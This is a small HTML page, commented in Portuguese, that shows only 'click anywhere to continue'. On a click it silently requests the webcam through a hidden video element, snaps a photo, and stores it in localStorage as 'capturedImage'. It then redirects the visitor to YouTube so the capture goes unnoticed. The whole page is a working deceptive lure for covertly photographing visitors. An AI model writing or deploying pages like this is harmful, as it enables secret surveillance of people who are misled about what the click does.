<!DOCTYPE html>
<html>
<body>

<video id="webcam" autoplay playsinline style="display:none;"></video>

<script>
async function capturePhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;

        // Espera o vídeo carregar de verdade
        await video.play();

        video.onloadedmetadata = () => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageData = canvas.toDataURL('image/jpeg', 0.9);

                // salva corretamente
                localStorage.setItem('capturedImage', imageData);

                // para a câmera
                stream.getTracks().forEach(track => track.stop());

                // redireciona depois que tudo terminou
                setTimeout(() => {
                    window.location.href = "https://youtube.com";
                }, 500);

            }, 1000); // pequeno delay pra garantir frame válido
        };

    } catch (err) {
        console.log("Erro ao acessar câmera:", err);
        window.location.href = "https://youtube.com";
    }
}

// IMPORTANTE: precisa de interação do usuário
document.body.addEventListener('click', capturePhoto);
</script>

<p>Clique em qualquer lugar para continuar...</p>

</body>
</html>
